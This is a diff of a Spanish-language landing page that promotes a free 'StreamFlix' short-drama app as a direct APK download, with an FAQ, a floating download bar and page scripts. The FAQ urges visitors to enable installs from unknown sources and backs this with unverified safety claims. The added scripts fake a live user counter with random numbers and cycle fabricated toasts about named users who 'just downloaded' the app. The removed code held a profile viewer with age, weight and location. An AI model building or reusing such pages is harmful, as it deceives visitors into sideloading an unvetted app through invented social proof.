+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
+      Oferta de lanzamiento — 100% gratis por tiempo limitado
+    </div>
+    <h2>Dramas cortos, <em>emociones grandes</em></h2>
+    <p>Miles de series cortas verticales. Mira 1 episodio en 60 segundos. Descarga y ve sin conexión. Nuevos dramas cada día. Sin anuncios.</p>
+    <button class="btn btn-primary" onclick="k2()">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
+      Descargar Gratis — Ver Ahora
+    </button>
+    <p class="note">Android 8.0+ · Actualizaciones automáticas · Sin anuncios</p>
+  </div>
+</section>
+
+<!-- ============================================================
+     FAQ
+     ============================================================ -->
+<section class="section" id="faq">
+  <div class="container">
+    <div class="section-head reveal">
+      <div class="kicker">Preguntas Frecuentes</div>
+      <h2>¿Tienes preguntas? <em>Tenemos respuestas.</em></h2>
+    </div>
+
+    <div class="faq-wrap reveal">
+      <div class="faq-entry">
+        <button class="faq-q" onclick="toggleFaq(this)">
+          ¿Es seguro instalar el APK?
+          <span class="faq-indicator"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg></span>
+        </button>
+        <div class="faq-a"><div class="faq-a-inner">Absolutamente. Cada versión pasa por el análisis de VirusTotal (más de 72 motores), firma de código SHA-256 y revisión de seguridad manual antes de su publicación. Nunca incluimos adware, spyware ni software no deseado. Puedes verificar la firma tú mismo usando el hash publicado en nuestra página de seguridad.</div></div>
+      </div>
+      <div class="faq-entry">
+        <button class="faq-q" onclick="toggleFaq(this)">
+          ¿Por qué la app no está en Google Play o App Store?
+          <span class="faq-indicator"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg></span>
+        </button>
+        <div class="faq-a"><div class="faq-a-inner">Estamos en una fase de iteración rápida — publicando actualizaciones cada 2 semanas con nuevas funciones y mejoras. La distribución directa nos permite avanzar más rápido sin los retrasos de revisión de las tiendas de aplicaciones. Las publicaciones en tiendas están planificadas para finales de 2026 una vez que alcancemos nuestro hito de funciones completas. La misma app, la misma calidad, solo que con actualizaciones más rápidas para ti.</div></div>
+      </div>
+      <div class="faq-entry">
+        <button class="faq-q" onclick="toggleFaq(this)">
+          ¿Cómo instalo el APK en Android?
+          <span class="faq-indicator"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg></span>
+        </button>
+        <div class="faq-a"><div class="faq-a-inner">1. Toca el botón Descargar APK arriba.<br>2. Abre el archivo .apk descargado.<br>3. Si se te solicita, permite "Instalar desde fuentes desconocidas" en Configuración → Seguridad.<br>4. ¡Toca Instalar y listo! La app se actualizará automáticamente después — no necesitas descargar manualmente versiones futuras.</div></div>
+      </div>
+      <div class="faq-entry">
+        <button class="faq-q" onclick="toggleFaq(this)">
+          ¿Es realmente gratis? ¿Cuál es la trampa?
+          <span class="faq-indicator"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg></span>
+        </button>
+        <div class="faq-a"><div class="faq-a-inner">Sí — 100% gratis. Sin cargos ocultos, sin suscripciones forzadas, sin muros de pago en el contenido. Estamos construyendo nuestra base de usuarios y creemos que si hacemos la mejor experiencia, el crecimiento llega solo. Las funciones premium (como descargas sin conexión) también son gratuitas durante nuestro período de lanzamiento. ¡Disfrútalas mientras dure!</div></div>
+      </div>
+      <div class="faq-entry">
+        <button class="faq-q" onclick="toggleFaq(this)">
+          ¿Qué dispositivos y versiones de SO son compatibles?
+          <span class="faq-indicator"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg></span>
+        </button>
+        <div class="faq-a"><div class="faq-a-inner">Android 8.0 (Oreo) y superior para el APK. iOS 14+ para el IPA. Funciona en teléfonos, tabletas, Android TV y Fire TV Stick. Recomendamos al menos 2 GB de RAM para la mejor experiencia. Chromecast y AirPlay están integrados.</div></div>
+      </div>
+      <div class="faq-entry">
+        <button class="faq-q" onclick="toggleFaq(this)">
+          ¿Cómo obtengo actualizaciones después de instalar?
+          <span class="faq-indicator"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg></span>
+        </button>
+        <div class="faq-a"><div class="faq-a-inner">La app tiene un actualizador automático integrado. Cuando una nueva versión esté disponible, recibirás una notificación dentro de la app — solo toca "Actualizar" y se encarga de todo. No necesitas volver a visitar esta página ni descargar manualmente de nuevo. Publicamos actualizaciones aproximadamente cada 2 semanas con correcciones y nuevas funciones.</div></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+</main>
+
+<footer class="page-footer">
+  <div class="container footer-inner">
+    <div class="footer-brand">
+      <img src="img/logo.jpg" alt="StreamFlix">
+      © 2026 StreamFlix
+    </div>
+    <div class="footer-links">
+      <a href="#">Privacidad</a>
+      <a href="#">Términos</a>
+      <a href="#">Seguridad</a>
+    </div>
+  </div>
+</footer>
+
+<!-- ============================================================
+     FLOAT BAR
+     ============================================================ -->
+<div class="float-bar" id="floatBar">
+  <div class="float-bar-inner">
+    <img class="float-bar-logo" src="img/logo.jpg" alt="StreamFlix">
+    <div class="float-bar-info">
+      <div class="t">StreamFlix</div>
+      <div class="s">Series cortas gratis · Sin anuncios</div>
+    </div>
+    <button class="btn btn-primary" onclick="k2()">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
+      Descargar Gratis
+    </button>
+  </div>
 </div>
 
 <script>
-// Open viewer with 3 images
-function openViewer(n, name, job, age, height, weight, loc, folder) {
-  var carousel = document.getElementById('viewerCarousel');
-  var dots = document.getElementById('viewerDots');
-  var info = document.getElementById('viewerInfo');
-  var viewer = document.getElementById('viewer');
-  var base = folder || 'img';
+// ---- Top nav scroll detection ----
+var topNav=document.getElementById('topNav');
+function updateNav(){
+  if(window.scrollY>20){topNav.classList.add('scrolled')}
+  else{topNav.classList.remove('scrolled')}
+}
+window.addEventListener('scroll',updateNav,{passive:true});
 
-  carousel.innerHTML = '';
-  dots.innerHTML = '';
-  for (var i = 1; i <= 3; i++) {
-    var img = document.createElement('img');
-    img.src = base + '/' + n + '-' + i + '.jpg';
-    carousel.appendChild(img);
-    var dot = document.createElement('span');
-    dot.className = 'viewer-dot' + (i === 1 ? ' on' : '');
-    dots.appendChild(dot);
+// ---- Floating bar ----
+var floatBar=document.getElementById('floatBar');
+function updateBar(){
+  if(window.scrollY>window.innerHeight*0.7){floatBar.classList.add('on')}
+  else{floatBar.classList.remove('on')}
+}
+window.addEventListener('scroll',updateBar,{passive:true});
+updateBar();
+
+// ---- Scroll reveal ----
+var revealObserver=new IntersectionObserver(function(entries){
+  entries.forEach(function(entry){
+    if(entry.isIntersecting){entry.target.classList.add('visible');revealObserver.unobserve(entry.target)}
+  });
+},{threshold:0.1,rootMargin:'0px 0px -40px 0px'});
+document.querySelectorAll('.reveal').forEach(function(el){revealObserver.observe(el)});
+
+// ---- FAQ ----
+function toggleFaq(q){
+  var item=q.parentElement;
+  var wasOpen=item.classList.contains('open');
+  document.querySelectorAll('.faq-entry').forEach(function(i){i.classList.remove('open')});
+  if(!wasOpen)item.classList.add('open');
+}
+
+// ---- Marquee build (seamless duplicate) ----
+(function(){
+  var track=document.getElementById('marqueeTrack');
+  if(!track)return;
+  var data=[
+    {t:'De Repente CASADOS',tag:'Romance',img:'img/1.jpg'},
+    {t:'Sr. DENVER',tag:'Éxito',img:'img/2.jpg'},
+    {t:'Swapped Heiress',tag:'Venganza',img:'img/3.jpg'},
+    {t:'Matrimonio al Rojo Vivo',tag:'Drama',img:'img/4.jpg'},
+    {t:'Estrella de Fútbol',tag:'Venganza',img:'img/5.jpg'},
+    {t:'Ruling Over All I See',tag:'Fantasía',img:'img/6.jpg'},
+    {t:'Husband Swap Game',tag:'Suspenso',img:'img/7.jpg'},
+    {t:'Cuenta Regresiva',tag:'Fantasía',img:'img/8.jpg'},
+    {t:'La Heredera Divorciada',tag:'Drama',img:'img/9.jpg'},
+    {t:'La tierna tortura',tag:'Romance',img:'img/10.jpg'}
+  ];
+  var html='';
+  for(var r=0;r<2;r++){
+    for(var i=0;i<data.length;i++){
+      var d=data[i];
+      html+='<div class="marquee-card" onclick="k2()"><span class="marquee-tag">'+d.tag+'</span><span class="marquee-title">'+d.t+'</span><img src="'+d.img+'" alt="'+d.t+'" loading="lazy"></div>';
+    }
   }
-  carousel.scrollLeft = 0;
-
-  info.innerHTML = '<div class="v-name">' + name + ', ' + age + '</div>' +
-    '<div class="v-job">' + job + '</div>' +
-    '<div class="v-stats">' + height + ' · ' + weight + '</div>' +
-    '<div class="v-loc">' + loc + '</div>';
-
-  viewer.classList.add('on');
-  document.body.style.overflow = 'hidden';
-}
-
-var viewerIdx = 0;
-function viewerSlide(dir) {
-  var carousel = document.getElementById('viewerCarousel');
-  var w = carousel.clientWidth;
-  viewerIdx += dir;
-  if (viewerIdx < 0) viewerIdx = 2;
-  if (viewerIdx > 2) viewerIdx = 0;
-  carousel.scrollTo({ left: viewerIdx * w, behavior: 'smooth' });
-}
-
-function closeViewer() {
-  document.getElementById('viewer').classList.remove('on');
-  document.body.style.overflow = '';
-}
-
-function updateViewerDots() {
-  var carousel = document.getElementById('viewerCarousel');
-  var dots = document.querySelectorAll('#viewerDots .viewer-dot');
-  var idx = Math.round(carousel.scrollLeft / carousel.clientWidth);
-  if (idx >= dots.length) idx = dots.length - 1;
-  if (idx < 0) idx = 0;
-  dots.forEach(function(d, i) { d.classList.toggle('on', i === idx); });
-}
-
-// Hot carousel auto-scroll + dots
-(function() {
-  var c = document.getElementById('hotScroll');
-  var dots = document.querySelectorAll('#hotDots .hot-dot');
-  if (!c || !dots.length) return;
-  var cards = c.querySelectorAll('.hot-card');
-  var i = 0;
-  var t = cards.length;
-  function scrollTo(idx) {
-    var w = cards[0] ? cards[0].offsetWidth + 10 : 150;
-    if (idx >= t) { idx = 0; c.scrollTo({ left: 0, behavior: 'instant' }); }
-    c.scrollTo({ left: idx * w, behavior: 'smooth' });
-    dots.forEach(function(d, di) { d.classList.toggle('on', di === idx % t); });
-  }
-  c.addEventListener('scroll', function() {
-    var w = cards[0] ? cards[0].offsetWidth + 10 : 150;
-    var idx = Math.round(c.scrollLeft / w);
-    if (idx >= t) idx = 0;
-    dots.forEach(function(d, di) { d.classList.toggle('on', di === idx); });
-    i = idx;
-  }, {passive: true});
-  setInterval(function() {
-    i = (i + 1) % t;
-    scrollTo(i);
-  }, 2500);
+  track.innerHTML=html;
 })();
 
-// Review carousel auto-scroll
-(function() {
-    var c = document.getElementById('reviewCarousel');
-    if (!c) return;
-    var cards = c.querySelectorAll('.review-card');
-    var i = 0;
-    var t = cards.length;
-    var w = cards[0] ? cards[0].offsetWidth + 10 : 260;
-    function scroll() {
-        i = (i + 1) % t;
-        c.scrollTo({ left: i * w, behavior: 'smooth' });
-    }
-    setInterval(scroll, 2000);
+// ---- Live activity counter ----
+(function(){
+  var el=document.getElementById('liveCount');
+  if(!el)return;
+  var base=2847;
+  var delta=Math.floor(Math.random()*200)-100;
+  function tick(){
+    delta=Math.max(-800,Math.min(800,delta+(Math.floor(Math.random()*45)-22)));
+    var v=base+delta;
+    if(v<1900)v=1900+Math.floor(Math.random()*200);
+    if(v>4200)v=4200-Math.floor(Math.random()*200);
+    el.textContent=v.toLocaleString('en-US');
+    base=v;
+  }
+  setInterval(tick,3500);
+})();
+
+// ---- Social proof toast ----
+(function(){
+  var toast=document.getElementById('socialToast');
+  if(!toast)return;
+  var msgEl=document.getElementById('toastMsg');
+  var timeEl=document.getElementById('toastTime');
+  var avatarEl=document.getElementById('toastAvatar');
+  var avatars=['img/a/c1.jpg','img/a/c2.jpg','img/a/c3.jpg','img/a/c4.jpg','img/a/c5.jpg'];
+
+  var users=[
+    {name:'J**n S.', action:'acaba de descargar la app'},
+    {name:'E**y W.', action:'completó la descarga'},
+    {name:'M**l B.', action:'acaba de instalar StreamFlix'},
+    {name:'S**a R.', action:'acaba de descargar la app'},
+    {name:'D**d K.', action:'completó la descarga'},
+    {name:'L**a T.', action:'acaba de instalar la app'},
+    {name:'C**s P.', action:'acaba de descargar StreamFlix'},
+    {name:'A**x N.', action:'completó la descarga'},
+    {name:'J**a H.', action:'acaba de descargar la app'},
+    {name:'R**t M.', action:'acaba de instalar StreamFlix'},
+    {name:'N**e C.', action:'completó la descarga'},
+    {name:'T**y F.', action:'acaba de descargar la app'}
+  ];
+
+  var lastIdx=-1;
+  var isVisible=false;
+  var hideTimer=null;
+  var nextTimer=null;
+
+  function showToast(){
+    if(isVisible)return;
+    var idx;
+    do{idx=Math.floor(Math.random()*users.length)}while(idx===lastIdx && users.length>1);
+    lastIdx=idx;
+    var u=users[idx];
+    var min=Math.floor(Math.random()*5)+1;
+    msgEl.textContent=u.name+' '+u.action;
+    timeEl.textContent='Hace '+min+' min';
+    if(avatarEl)avatarEl.src=avatars[idx % avatars.length];
+    toast.classList.remove('hide');
+    toast.classList.add('show');
+    isVisible=true;
+    clearTimeout(hideTimer);
+    hideTimer=setTimeout(hideToast,4200);
+  }
+
+  function hideToast(){
+    toast.classList.remove('show');
+    toast.classList.add('hide');
+    isVisible=false;
+    clearTimeout(nextTimer);
+    var delay=15000+Math.floor(Math.random()*18000);
+    nextTimer=setTimeout(showToast,delay);
+  }
+
+  window.dismissToast=function(){
+    clearTimeout(hideTimer);
+    hideToast();
+  };
+
+  nextTimer=setTimeout(showToast,5000);
 })();
 </script>
-
 </body>
 </html>
